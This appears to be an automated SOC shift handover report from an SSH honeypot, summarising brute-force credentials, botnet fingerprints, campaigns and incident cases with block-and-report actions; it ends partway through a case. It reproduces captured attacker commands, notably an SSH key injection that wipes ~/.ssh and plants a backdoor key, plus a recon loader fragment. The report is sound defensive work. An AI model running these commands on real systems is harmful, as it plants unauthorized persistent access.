# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-06 |
| **Generated At** | 2026-09-06T08:32:49Z |
| **Shift Time** | 08:32 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **236** |
| Confirmed Threats | **211** |
| False Positives Filtered | **25** (10.6%) |
| Unique Attacker IPs | **67** |
| Countries of Origin | **32** |
| High Severity Cases | **106** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **130** |
| Malware Samples Analyzed | **4** HIGH · **20** MED · 19 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **148** |
| Unique Credential Pairs | **117** |
| Unique Usernames | **19** |
| Unique Passwords | **97** |
| Successful Auth Pairs | **122** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 83 |
| `admin` | 17 |
| `support` | 11 |
| `345gs5662d34` | 11 |
| `uucp` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 11 |
| `345gs5662d34` | 11 |
| `3245gs5662d34` | 11 |
| `` | 8 |
| `123456` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 11 |
| `345gs5662d34` | `345gs5662d34` | 11 |
| `admin` | `` | 8 |
| `root` | `123@@@` | 2 |
| `root` | `LeitboGi0ro` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `176.53.159.196` | 2026-09-06T03:03:34 |
| `root` | `123@@@` | `64.110.90.250` | 2026-09-06T03:03:54 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-09-06T03:03:54 |
| `uucp` | `uucp` | `10.0.0.73` | 2026-09-06T03:20:55 |
| `uucp` | `uucp` | `138.226.239.234` | 2026-09-06T03:25:03 |
| `support` | `support` | `10.0.0.73` | 2026-09-06T03:28:14 |
| `username` | `password` | `77.90.185.17` | 2026-09-06T03:30:28 |
| `admin` | `admin` | `35.189.208.114` | 2026-09-06T03:34:34 |
| `halley` | `halley` | `156.225.20.213` | 2026-09-06T03:52:53 |
| `345gs5662d34` | `345gs5662d34` | `156.225.20.213` | 2026-09-06T03:52:57 |
| `halley` | `3245gs5662d34` | `156.225.20.213` | 2026-09-06T03:52:59 |
| `prueba` | `123456` | `103.194.243.199` | 2026-09-06T03:55:37 |
| `testeftp` | `testeftp` | `178.105.31.42` | 2026-09-06T03:55:40 |
| `345gs5662d34` | `345gs5662d34` | `103.194.243.199` | 2026-09-06T03:55:42 |
| `345gs5662d34` | `345gs5662d34` | `178.105.31.42` | 2026-09-06T03:55:42 |
| `testeftp` | `3245gs5662d34` | `178.105.31.42` | 2026-09-06T03:55:43 |
| `prueba` | `3245gs5662d34` | `103.194.243.199` | 2026-09-06T03:55:44 |
| `sftpuser` | `test` | `10.0.0.73` | 2026-09-06T03:59:09 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-06T03:59:11 |
| `sftpuser` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T03:59:12 |
| `root` | `root@root` | `10.0.0.73` | 2026-09-06T04:02:16 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T04:02:23 |
| `root` | `!root` | `193.32.162.84` | 2026-09-06T04:03:20 |
| `root` | `111111` | `193.32.162.84` | 2026-09-06T04:05:14 |
| `root` | `123123` | `193.32.162.84` | 2026-09-06T04:07:08 |
| `root` | `123321` | `193.32.162.84` | 2026-09-06T04:09:04 |
| `bill` | `123456` | `10.0.0.73` | 2026-09-06T04:09:09 |
| `bill` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T04:09:23 |
| `root` | `1234` | `193.32.162.84` | 2026-09-06T04:10:56 |
| `root` | `12345` | `193.32.162.84` | 2026-09-06T04:12:50 |
| `root` | `1234567` | `193.32.162.84` | 2026-09-06T04:16:37 |
| `root` | `12345678` | `193.32.162.84` | 2026-09-06T04:18:30 |
| `root` | `123456789` | `193.32.162.84` | 2026-09-06T04:20:23 |
| `root` | `1234567890` | `193.32.162.84` | 2026-09-06T04:22:17 |
| `root` | `123456a` | `193.32.162.84` | 2026-09-06T04:24:11 |
| `root` | `123456b` | `193.32.162.84` | 2026-09-06T04:26:08 |
| `root` | `1234abcd` | `193.32.162.84` | 2026-09-06T04:28:01 |
| `root` | `123abc` | `193.32.162.84` | 2026-09-06T04:29:55 |
| `tomcat` | `Tomcat@123` | `10.0.0.73` | 2026-09-06T04:31:28 |
| `tomcat` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T04:31:31 |
| `root` | `123qwe` | `193.32.162.84` | 2026-09-06T04:31:50 |
| `root` | `1q2w3e4r` | `193.32.162.84` | 2026-09-06T04:33:39 |
| `root` | `1qaz2wsx` | `193.32.162.84` | 2026-09-06T04:35:31 |
| `root` | `1qaz@WSX` | `193.32.162.84` | 2026-09-06T04:37:26 |
| `root` | `21` | `193.32.162.84` | 2026-09-06T04:39:26 |
| `root` | `321` | `193.32.162.84` | 2026-09-06T04:41:23 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-09-06T04:43:07 |
| `root` | `4321` | `193.32.162.84` | 2026-09-06T04:43:17 |
| `root` | `54321` | `193.32.162.84` | 2026-09-06T04:45:07 |
| `root` | `555555` | `193.32.162.84` | 2026-09-06T04:47:00 |
| `root` | `654321` | `193.32.162.84` | 2026-09-06T04:48:52 |
| `root` | `7777777` | `193.32.162.84` | 2026-09-06T04:50:44 |
| `root` | `Admin2026!` | `193.32.162.84` | 2026-09-06T04:52:32 |
| `root` | `P4ssw0rd` | `193.32.162.84` | 2026-09-06T04:54:20 |
| `root` | `P4ssword` | `193.32.162.84` | 2026-09-06T04:56:12 |
| `root` | `P@ssw0rd` | `193.32.162.84` | 2026-09-06T04:58:09 |
| `root` | `P@ssw0rd2026` | `193.32.162.84` | 2026-09-06T05:00:07 |
| `root` | `P@ssword` | `193.32.162.84` | 2026-09-06T05:02:16 |
| `root` | `Passw0rd` | `193.32.162.84` | 2026-09-06T05:04:11 |
| `root` | `Password1` | `193.32.162.84` | 2026-09-06T05:05:57 |
| `root` | `Root123` | `193.32.162.84` | 2026-09-06T05:07:45 |
| `paulina` | `paulina` | `10.0.0.73` | 2026-09-06T05:09:21 |
| `paulina` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T05:09:28 |
| `root` | `abc123` | `193.32.162.84` | 2026-09-06T05:09:37 |
| `root` | `admin` | `193.32.162.84` | 2026-09-06T05:11:29 |
| `root` | `alpine` | `193.32.162.84` | 2026-09-06T05:13:22 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-09-06T05:14:25 |
| `root` | `changeme` | `193.32.162.84` | 2026-09-06T05:15:23 |
| `root` | `default` | `193.32.162.84` | 2026-09-06T05:17:29 |
| `root` | `letmein` | `193.32.162.84` | 2026-09-06T05:19:21 |
| `root` | `p4ssword` | `193.32.162.84` | 2026-09-06T05:21:08 |
| `root` | `passw0rd` | `193.32.162.84` | 2026-09-06T05:22:54 |
| `root` | `password` | `193.32.162.84` | 2026-09-06T05:24:39 |
| `root` | `qwerty` | `193.32.162.84` | 2026-09-06T05:26:23 |
| `root` | `qwerty123456` | `193.32.162.84` | 2026-09-06T05:28:10 |
| `root` | `r00t` | `193.32.162.84` | 2026-09-06T05:29:55 |
| `root` | `root!@#` | `193.32.162.84` | 2026-09-06T05:33:31 |
| `root` | `root#123` | `193.32.162.84` | 2026-09-06T05:35:26 |
| `root` | `root0000` | `193.32.162.84` | 2026-09-06T05:37:23 |
| `root` | `root1111` | `193.32.162.84` | 2026-09-06T05:39:26 |
| `root` | `root123` | `193.32.162.84` | 2026-09-06T05:41:27 |
| `root` | `root1234` | `193.32.162.84` | 2026-09-06T05:43:15 |
| `root` | `root123456` | `193.32.162.84` | 2026-09-06T05:45:01 |
| `root` | `root2024` | `193.32.162.84` | 2026-09-06T05:46:50 |
| `spectrum` | `spectrum` | `10.0.0.73` | 2026-09-06T05:47:32 |
| `spectrum` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T05:47:34 |
| `root` | `root2025` | `193.32.162.84` | 2026-09-06T05:48:37 |
| `splunk` | `splunk` | `10.0.0.73` | 2026-09-06T05:49:52 |
| `splunk` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T05:49:59 |
| `root` | `root2026` | `193.32.162.84` | 2026-09-06T05:50:26 |
| `couchdb` | `couchdb` | `10.0.0.73` | 2026-09-06T05:50:39 |
| `couchdb` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T05:50:45 |
| `root` | `root2222` | `193.32.162.84` | 2026-09-06T05:52:16 |
| `root` | `root4444` | `193.32.162.84` | 2026-09-06T05:54:09 |
| `root` | `root5555` | `193.32.162.84` | 2026-09-06T05:56:01 |
| `root` | `root6666` | `193.32.162.84` | 2026-09-06T05:57:58 |
| `root` | `root9999` | `193.32.162.84` | 2026-09-06T05:59:58 |
| `root` | `root@123` | `193.32.162.84` | 2026-09-06T06:01:58 |
| `root` | `rootaccess` | `193.32.162.84` | 2026-09-06T06:03:42 |
| `root` | `rootadmin` | `193.32.162.84` | 2026-09-06T06:05:22 |
| `root` | `rootme` | `193.32.162.84` | 2026-09-06T06:07:05 |
| `support` | `support` | `138.226.239.234` | 2026-09-06T06:07:19 |
| `root` | `rootpass` | `193.32.162.84` | 2026-09-06T06:08:45 |
| `support` | `support` | `77.90.185.17` | 2026-09-06T06:09:33 |
| `root` | `rootpw` | `193.32.162.84` | 2026-09-06T06:10:27 |
| `root` | `rootroot` | `193.32.162.84` | 2026-09-06T06:12:08 |
| `root` | `system` | `193.32.162.84` | 2026-09-06T06:13:50 |
| `root` | `toor` | `193.32.162.84` | 2026-09-06T06:15:32 |
| `root` | `welcome` | `193.32.162.84` | 2026-09-06T06:17:17 |
| `admin` | `000000` | `193.32.162.84` | 2026-09-06T06:18:59 |
| `admin` | `111111` | `193.32.162.84` | 2026-09-06T06:20:43 |
| `admin` | `123123` | `193.32.162.84` | 2026-09-06T06:22:22 |
| `admin` | `123321` | `193.32.162.84` | 2026-09-06T06:24:02 |
| `admin` | `1234` | `193.32.162.84` | 2026-09-06T06:25:43 |
| `admin` | `12345` | `193.32.162.84` | 2026-09-06T06:27:22 |
| `admin` | `admin` | `124.243.191.241` | 2026-09-06T06:27:52 |
| `admin` | `123456` | `193.32.162.84` | 2026-09-06T06:29:00 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.156.92.167` | 2026-09-06T06:46:47 |
| `*1` | `$4` | `34.156.92.167` | 2026-09-06T06:46:56 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 798` | `34.156.92.167` | 2026-09-06T06:46:58 |
| `root` | `1` | `80.94.92.234` | 2026-09-06T06:51:32 |
| `root` | `12` | `80.94.92.234` | 2026-09-06T06:54:02 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **236** |
| Sessions with Fingerprint | **18** |
| Unique HASSH Fingerprints | **18** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 108 |
| libssh | 11 |
| Nmap scanner | 6 |
| OpenSSH | 5 |
| Paramiko (Python) | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 82 | 2 |
| `f555226df196...` | Mirai/variant | 10 | 4 |
| `e788c657d1a2...` | Mirai/variant | 6 | 1 |
| `eff4c24daffc...` | Modern SSH client | 4 | 1 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 82 | 2 | Mirai/variant |
| `95420f9d932d...` | Go SSH scanner | 11 | 7 | — |
| `f555226df196...` | libssh | 10 | 4 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 4 | 1 | Mirai/variant |
| `390ffe68a68c...` | OpenSSH | 4 | 2 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |
| **Recon Loader Script** | 🟡 MEDIUM | 80 | 2 | `T1082, T1592, T1078, T1083` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.194.243.199`, `156.225.20.213`, `178.105.31.42`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch
```
Source IPs: `193.32.162.84`, `80.94.92.234`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **67** |
| Unique ASNs | **37** |
| High-Risk ASNs | **26** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 19 | HIGH |
| `AS396982` | Google LLC | 8 | HIGH |
| `AS21859` | Zenlayer Inc | 3 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS10617` | SION S.A | 2 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS8193` | Uzbektelekom Joint Stock Company | 1 | MEDIUM |
| `AS31898` | Oracle Corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (106)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-631eded02d20

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-06 03:03 |
| **Last Seen** | 2026-09-06 03:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:03:33` | `cowrie.session.connect` |
| `2026-09-06 03:03:33` | `cowrie.client.version` |
| `2026-09-06 03:03:33` | `cowrie.client.kex` |
| `2026-09-06 03:03:34` | `cowrie.login.success` |
| `2026-09-06 03:03:34` | `cowrie.direct-tcpip.request` |
| `2026-09-06 03:03:34` | `cowrie.direct-tcpip.data` |
| `2026-09-06 03:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0dfc1018c49

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-06 03:03 |
| **Last Seen** | 2026-09-06 03:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:03:53` | `cowrie.session.connect` |
| `2026-09-06 03:03:53` | `cowrie.client.version` |
| `2026-09-06 03:03:53` | `cowrie.client.kex` |
| `2026-09-06 03:03:54` | `cowrie.login.success` |
| `2026-09-06 03:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-505b00e720fb

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-06 03:03 |
| **Last Seen** | 2026-09-06 03:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:03:53` | `cowrie.session.connect` |
| `2026-09-06 03:03:53` | `cowrie.client.version` |
| `2026-09-06 03:03:53` | `cowrie.client.kex` |
| `2026-09-06 03:03:54` | `cowrie.login.success` |
| `2026-09-06 03:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e02b54dbf162

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-06 03:25 |
| **Last Seen** | 2026-09-06 03:25 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:25:03` | `cowrie.session.connect` |
| `2026-09-06 03:25:03` | `cowrie.client.version` |
| `2026-09-06 03:25:03` | `cowrie.client.kex` |
| `2026-09-06 03:25:03` | `cowrie.login.success` |
| `2026-09-06 03:25:09` | `cowrie.direct-tcpip.request` |
| `2026-09-06 03:25:12` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 03:25:12` | `cowrie.direct-tcpip.data` |
| `2026-09-06 03:25:15` | `cowrie.direct-tcpip.request` |
| `2026-09-06 03:25:17` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 03:25:17` | `cowrie.direct-tcpip.data` |
| `2026-09-06 03:25:20` | `cowrie.direct-tcpip.request` |
| `2026-09-06 03:25:24` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 03:25:24` | `cowrie.direct-tcpip.data` |
| `2026-09-06 03:25:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77e12550ba1d

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-06 03:30 |
| **Last Seen** | 2026-09-06 03:30 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:30:27` | `cowrie.session.connect` |
| `2026-09-06 03:30:27` | `cowrie.client.version` |
| `2026-09-06 03:30:27` | `cowrie.client.kex` |
| `2026-09-06 03:30:28` | `cowrie.login.success` |
| `2026-09-06 03:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5668818d1121

| Field | Detail |
|---|---|
| **Source IP** | `35.189.208[.]114` |
| **First Seen** | 2026-09-06 03:34 |
| **Last Seen** | 2026-09-06 03:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:34:31` | `cowrie.session.connect` |
| `2026-09-06 03:34:31` | `cowrie.client.version` |
| `2026-09-06 03:34:31` | `cowrie.client.kex` |
| `2026-09-06 03:34:34` | `cowrie.login.success` |
| `2026-09-06 03:34:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.189.208[.]114` to AbuseIPDB if not already reported
- [ ] Block `35.189.208[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87388d24d305

| Field | Detail |
|---|---|
| **Source IP** | `156.225.20[.]213` |
| **First Seen** | 2026-09-06 03:52 |
| **Last Seen** | 2026-09-06 03:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:52:52` | `cowrie.session.connect` |
| `2026-09-06 03:52:52` | `cowrie.client.version` |
| `2026-09-06 03:52:52` | `cowrie.client.kex` |
| `2026-09-06 03:52:53` | `cowrie.login.success` |
| `2026-09-06 03:52:54` | `cowrie.session.params` |
| `2026-09-06 03:52:54` | `cowrie.command.input` |
| `2026-09-06 03:52:54` | `cowrie.command.failed` |
| `2026-09-06 03:52:55` | `cowrie.log.closed` |
| `2026-09-06 03:52:56` | `cowrie.session.params` |
| `2026-09-06 03:52:56` | `cowrie.command.input` |
| `2026-09-06 03:52:56` | `cowrie.session.file_download` |
| `2026-09-06 03:52:56` | `cowrie.log.closed` |
| `2026-09-06 03:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.225.20[.]213` to AbuseIPDB if not already reported
- [ ] Block `156.225.20[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f5b2e5726a2

| Field | Detail |
|---|---|
| **Source IP** | `156.225.20[.]213` |
| **First Seen** | 2026-09-06 03:52 |
| **Last Seen** | 2026-09-06 03:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:52:56` | `cowrie.session.connect` |
| `2026-09-06 03:52:56` | `cowrie.client.version` |
| `2026-09-06 03:52:56` | `cowrie.client.kex` |
| `2026-09-06 03:52:57` | `cowrie.login.success` |
| `2026-09-06 03:52:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.225.20[.]213` to AbuseIPDB if not already reported
- [ ] Block `156.225.20[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd7d2f7d0acb

| Field | Detail |
|---|---|
| **Source IP** | `156.225.20[.]213` |
| **First Seen** | 2026-09-06 03:52 |
| **Last Seen** | 2026-09-06 03:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:52:58` | `cowrie.session.connect` |
| `2026-09-06 03:52:58` | `cowrie.client.version` |
| `2026-09-06 03:52:58` | `cowrie.client.kex` |
| `2026-09-06 03:52:59` | `cowrie.login.success` |
| `2026-09-06 03:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.225.20[.]213` to AbuseIPDB if not already reported
- [ ] Block `156.225.20[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66c9a7cf6cdf

| Field | Detail |
|---|---|
| **Source IP** | `103.194.243[.]199` |
| **First Seen** | 2026-09-06 03:55 |
| **Last Seen** | 2026-09-06 03:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:55:35` | `cowrie.session.connect` |
| `2026-09-06 03:55:35` | `cowrie.client.version` |
| `2026-09-06 03:55:35` | `cowrie.client.kex` |
| `2026-09-06 03:55:37` | `cowrie.login.success` |
| `2026-09-06 03:55:38` | `cowrie.session.params` |
| `2026-09-06 03:55:38` | `cowrie.command.input` |
| `2026-09-06 03:55:38` | `cowrie.command.failed` |
| `2026-09-06 03:55:38` | `cowrie.log.closed` |
| `2026-09-06 03:55:39` | `cowrie.session.params` |
| `2026-09-06 03:55:39` | `cowrie.command.input` |
| `2026-09-06 03:55:40` | `cowrie.session.file_download` |
| `2026-09-06 03:55:40` | `cowrie.log.closed` |
| `2026-09-06 03:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.243[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.194.243[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b1cbfce4c74

| Field | Detail |
|---|---|
| **Source IP** | `178.105.31[.]42` |
| **First Seen** | 2026-09-06 03:55 |
| **Last Seen** | 2026-09-06 03:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
